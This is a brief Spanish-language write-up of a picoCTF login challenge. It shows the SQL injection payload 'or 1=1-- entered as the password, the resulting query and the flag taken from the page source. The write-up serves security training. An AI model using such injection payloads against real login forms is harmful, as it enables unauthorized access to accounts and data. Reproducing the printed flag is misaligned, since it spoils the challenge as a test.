## Objetivo
Can you login to this website?Try to login [here](http://saturn.picoctf.net:57949/).
## Solución
```bash
username: admin
password: 'or 1=1--
SQL query: SELECT * FROM users WHERE name='admin' AND password=''or 1=1--'

# Logged in! But can you see the flag, it is in plainsight.
```
## Notas Adicionales
Es un sitio de login, ingresamos cualquier cosa para descubrir que esta usando SQL, lo cual podemos aprovechar usando una inyeccion sql.
lo cual hice ingresando como usuario `admin` y password `'or 1=1--`
lo cual nos dice que estamos loggeados correctamente, ahora solo inspeccionamos la pagina y la flag se encuentra dentro de el codigo fuente de dicha pagina (login.php).
`picoCTF{L00k5_l1k3_y0u_solv3d_it_ec8a64c7}`
### Referencias